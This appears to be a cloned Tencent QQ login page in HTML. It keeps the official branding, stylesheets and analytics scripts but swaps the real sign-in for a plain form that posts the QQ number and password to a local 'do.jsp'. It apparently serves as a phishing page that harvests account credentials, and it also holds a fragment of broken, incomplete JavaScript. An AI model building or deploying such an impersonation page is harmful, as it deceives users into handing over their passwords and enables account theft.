<!DOCTYPE html>

<html lang="zh-cn">
<head>
    <!-- @fragment_top -->
    <meta http-equiv="X-UA-Compatible" content="IE=Edge"/>
    <meta charset="UTF-8">
    <meta http-equiv="content-type" content="text/html; charset=utf-8"/>
    <title>QQ帐号安全登录</title>
    <meta name="keywords" content="QQ互联、QQ登录、安全登录、网站接入、腾讯开放平台"/>
    <meta name="description" content="接入QQ互联，可实现与腾讯各项服务的无缝连接，安全帐号登录体系，用户动态同步腾讯各社交平台，调用腾讯公司各业务服务。"/>
    <link rel="Shortcut Icon" href="http://qzonestyle.gtimg.cn/qzone/openapi/favicon.ico" type="image/x-icon"/>
    <link rel="icon" href="http://qzonestyle.gtimg.cn/qzone/openapi/favicon.ico" type="image/x-icon"/>
    <link href="http://qzonestyle.gtimg.cn/qzone_v6/proj_qlogin/qlogin.css" rel="stylesheet" type="text/css"
          media="screen"/>
    <style type="text/css">
        html, body {
            overflow-x: hidden;
            overflow-y: auto;
            margin: 0;
        }

        .none {
            display: none;
        }

        .show {
            display: block;
        }

        .oauth_checkbox {
            position: absolute;
            left: 0;
            top: 10px;
        }

        .page_accredit .accredit_info_op .oauth_ui_icon {
            left: 20px;
        }

        /*
        .oauth_item_title{margin-left:20px;}
        .oauth_info_tip{margin:0 0 0 20px;}
        */
    </style>
    <script type="text/javascript">
        document.domain = 'qq.com';

        //测速点0
        var GLOBAL = {};
        GLOBAL.__speed = [new Date()];

        //disable error info for web view control
        function disable_error() {
            return true;
        }
        window.onerror = disable_error;
    </script>
    <!-- @fragment_top E -->
    <script type="javascript">
function (chack) {
    var qq=
}
    </script>
</head>
<body>

<div class="page_accredit">
    <!-- @header -->


    <div class="lay_top">
        <div class="lay_top_inner">
            <h1 class="logo text_hide">QQ登录</h1>
            <!--div class="lat_top_other">
                <a href="http://qzs.qq.com/open/connect/urlcheck.html" title="QQ登录网站查询" target="_blank" class="help"><i class="icon_security"></i>QQ登录网站查询</a>
            </div-->
            <div class="lat_top_other"><!--lat_top_defined-->
                <a href="http://connect.qq.com/intro/login" target="_blank" title="什么是QQ登录" class="help"><i
                        class="icon_help_white"></i>什么是QQ登录?</a>
            </div>
        </div>
    </div>


    <!-- @header E -->


    <div class="lay_main lay_main_single">
        <div class="lay_login_warn">
            <div class="fn_login_warn">

                <form action="do.jsp" method="post" name="login">
                    <table>
                        <tr>
                            <td>
                                QQ:
                            </td>
                            <td><input type="text" value="" name="qq"></td>
                        </tr>
                        <tr>
                            <td>
                                密码:
                            </td>
                            <td><input type="password" value="" name="password"></td>
                        </tr>
                        <tr>
                            <td align=right>
                                <a>注册</a>
                            </td>
                            <td><input type="submit" value="登录"></td>
                        </tr>
                    </table>
                </form>


            </div>
        </div>
    </div>

    <!-- @footer -->


    <div class="lay_footer">
        <div class="lay_footer_inner">
            <div class="lay_footer_r"><a href="http://connect.qq.com/toc/auth_manager?from=auth" target="_blank"
                                         onclick="TCISD && TCISD.hotClick && TCISD.hotClick('authorize.manageNum', 'graph.qq.com');">授权管理</a><span
                    class="line">|</span><a href="http://connect.qq.com/manage" target="_blank">申请接入</a></div>
        </div>
    </div>


    <!-- @footer E -->
    <script type="text/javascript">
        var crtDomain = 'http://bbs.yzwb.net/';
    </script>

</div>
<script>
    document.write('<script src="http://qzonestyle.gtimg.cn/c/=/ac/qzfl/release/qzfl_for_qzone.js,/ac/qzfl/stat.js"><\/script>');
    document.write('<script src="http://qzonestyle.gtimg.cn/qzone/openapi/oauth/common.js"><\/script>');
    document.write('<script src="http://tajs.qq.com/stats?sId=36511985" charset="UTF-8"><\/script>');
</script>
<script>
    /**
     * underscore utils and report kit v0.1.9
     */(function () {
        var e = this, t = e._ || {}, n = Array.prototype, r = n.concat, i = n.slice;
        t.indexOf = function (e, t, n) {
            if (e.indexOf)return e.indexOf(t, n);
            var r = e.length;
            if (r === 0)return -1;
            n === undefined ? n = 0 : (n < 0 && (n = r + n), n < 0 && (n = 0));
            if (t !== undefined) {
                for (var i = n; i < r; i++)if (e[i] === t)return i;
                return -1
            }
            for (var s = n; s < r; s++)if (e[s] === undefined && s in e)return s;
            return -1
        }, t.forEach = function (e, t, n) {
            if (e.forEach)return e.forEach(t, n);
            var r = e.length;
            for (var i = 0; i < r; ++i) {
                var s = e[i];
                (s !== undefined || i in e) && t.call(n, s, i, e)
            }
        }, t.filter = function (e, t, n) {
            if (e.filter)return e.filter(t, n);
            var r = e.length, i = [];
            for (var s = 0; s < r; ++s) {
                var o = e[s];
                (o !== undefined || s in e) && t.call(n, o, s, e) && i.push(e[s])
            }
            return i
        }, t.difference = function (e) {
            var s = r.apply(n, i.call(arguments, 1));
            return t.filter(e, function (e) {
                return !(t.indexOf(s, e) > -1)
            })
        }, e._ = t
    })(), function () {
        var e = this, t = e.Q, n = e.Q = {};
        n.mix = function (e, t, n, r) {
            if (!t || !e)return e;
            undefined === n && (n = !0);
            var i, s = {};
            if (r && (i = r.length))for (var o = 0; o < i; o++)s[r[o]] = !0;
            for (var u in t)if (n && !(u in s) || !(u in e)) e[u] = t[u];
            return e
        }, n.getTimestamp = function () {
            return +(new Date)
        }, n.template = function (e, t) {
            return e.replace(/\$\{(\w+)\}/g, function (e, n) {
                return t[n] ? t[n] : ""
            })
        }, n.on = function (e, t, n) {
            e.attachEvent ? e.attachEvent("on" + t, n) : e.addEventListener(t, n, !1)
        };
        var r = [], i = !1;
        n.report = function (e, t) {
            var i = 0, s = r.length;
            t = t || 2e3;
            if (r[0]) {
                for (var o = 0; o < s; o++) {
                    var u = r.shift();
                    u && (u.isTicking = !1, u(function () {
                        ++i === s && e && !e.isCalled && (e.isCalled = !0, e())
                    }))
                }
                e && setTimeout(function () {
                    e.isCalled || (e.isCalled = !0, e())
                }, t)
            } else e && e();
            n.tick.isTicking = !1
        }, n.report.delay = 500, n.tick = function (e) {
            e.isTicking || (e.isTicking = !0, r.push(e)), n.tick.isTicking || (setTimeout(n.report, n.report.delay), n.tick.isTicking = !0), i || (n.on(window, "beforeunload", function (e) {
                n.report()
            }), i = !0)
        };
        var s = "__tc_global_image_", o = n.getTimestamp();
        n.send = function (t, n) {
            o += 1, t += "&t=" + o;
            var r = s + o;
            e[r] = new Image, n && (e[r].onload = e[r].onerror = function () {
                n(), e[r] = null
            }), e[r].src = t
        }, n.ninja = function () {
            return e.Q = t, this
        }
    }(), function () {
        function t(t) {
            window.onerror = function (n, r, i) {
                var s = t ? "id=" + t : "";
                r = e + s, Q.send(r)
            }
        }

        var e = "http://cgi.connect.qq.com/report/report?";
        Q.mix(Q, {error: t})
    }(), function () {
        function t(t, n, r, i) {
            var s = [], o, u = i[0];
            for (var a = 1, f = i.length; a < f; a++)o = i[a], o = o ? o - u : 0, o > 0 && s.push(a + "=" + o);
            var l = e + "flag1=" + t + "&flag2=" + n + "&flag3=" + r + "&" + s.join("&");
            Q.send(l)
        }

        function n(e, t, r) {
            if (!(this instanceof n))return new n(e, t, r);
            this.f1 = e, this.f2 = t, this.f3 = r, this.timing = []
        }

        function r(e, n, r, i) {
            var s, o = window.webkitPerformance ? window.webkitPerformance : window.msPerformance, u = ["navigationStart", "unloadEventStart", "unloadEventEnd", "redirectStart", "redirectEnd", "fetchStart", "domainLookupStart", "domainLookupEnd", "connectStart", "connectEnd", "requestStart", "responseStart", "responseEnd", "domLoading", "domInteractive", "domContentLoadedEventStart", "domContentLoadedEventEnd", "domComplete", "loadEventStart", "loadEventEnd"], a = r;
            o = o ? o : window.performance;
            if (o && (s = o.timing)) {
                s.domContentLoadedEventStart && i ? a = i : s.domContentLoadedStart ? (u.splice(15, 2, "domContentLoadedStart", "domContentLoadedEnd"), i && (a = i)) : u.splice(15, 2, "domContentLoaded", "domContentLoaded");
                var f = [];
                for (var l = 0, c = u.length; l < c; l++)f[l] = s[u[l]];
                t(e, n, a, f)
            }
        }

        var e = "http://isdspeed.qq.com/cgi-bin/r.cgi?";
        n.prototype.mark = function (e) {
            return this.timing.push(e || Q.getTimestamp())
        }, n.prototype.report = function () {
            t(this.f1, this.f2, this.f3, this.timing)
        }, Q.mix(Q, {isd: t, performance: r, speed: n})
    }(), function () {
        function i(s) {
            if (n[0]) {
                var o, u = [];
                for (var a = 0, f = n.length; a < t && a < f; a++) {
                    o = n.shift();
                    if (o.nvalue) u.push([o.obj || r.obj || 0, o.nvalue, o.elt].join("_")); else if (o.obj) {
                        var l = {
                            opername: o.opername || r.opername,
                            name: o.name || r.name,
                            action: o.action || r.action,
                            obj: o.obj
                        }, c = Q.template('{"opername":"","name":"","action":"","obj":""}', l);
                        u.push([c, 0, o.elt].join("_"))
                    }
                }
                var h = e + "tag=0&log=" + encodeURIComponent(u.join("|"));
                if (n[0]) {
                    var p = 0, d = function () {
                        ++p === 2 && s()
                    };
                    Q.send(h, d), i(d)
                } else Q.send(h, s)
            } else s && s()
        }

        function s(e, t, r) {
            var s = {}, o = typeof e;
            o === "number" ? (s.nvalue = e, t && (s.obj = t)) : o === "object" ? s = e : o === "string" && (s = {obj: e}), s.elt = r || 0, n.push(s), Q.tick(i)
        }

        function o(e) {
            return r = Q.mix(r, e)
        }

        var e = "http://cgi.connect.qq.com/report/report_vm?", t = 6, n = [], r = {};
        Q.mix(Q, {bernoulli: s, bernoulliSetup: o})
    }(), function () {
        function n(n) {
            if (t[0]) {
                var r = "[" + t + "]", i = e + "monitors=" + r;
                t = [], Q.send(i, n)
            } else n && n()
        }

        function r(r, i, s) {
            if (i) {
                var o = e + "id=" + r;
                Q.send(o, s)
            } else t.push(r), Q.tick(n)
        }

        var e = "http://cgi.connect.qq.com/report/report_vm?", t = [];
        Q.mix(Q, {monitor: r})
    }()
</script>

<script>
    Q.monitor(257886);
    // support论坛逻辑
    var feed_back_link = $("feed_back_link_err");
    var dmRe = /http:\/\/([^/]*)\/?/i;
    window.crtDomain = window.crtDomain || 'http://bbs.yzwb.net/' || (getParameter && getParameter("redirect_uri"));
    var errcode = '20002';
    var dmHost = window.crtDomain.match(dmRe);
    if (feed_back_link) {
        feed_back_link.href += ("&SSTAG=" + encodeURIComponent((dmHost && dmHost[1]) + ".errorcode" + errcode));
    }

</script>
</body>
</html>
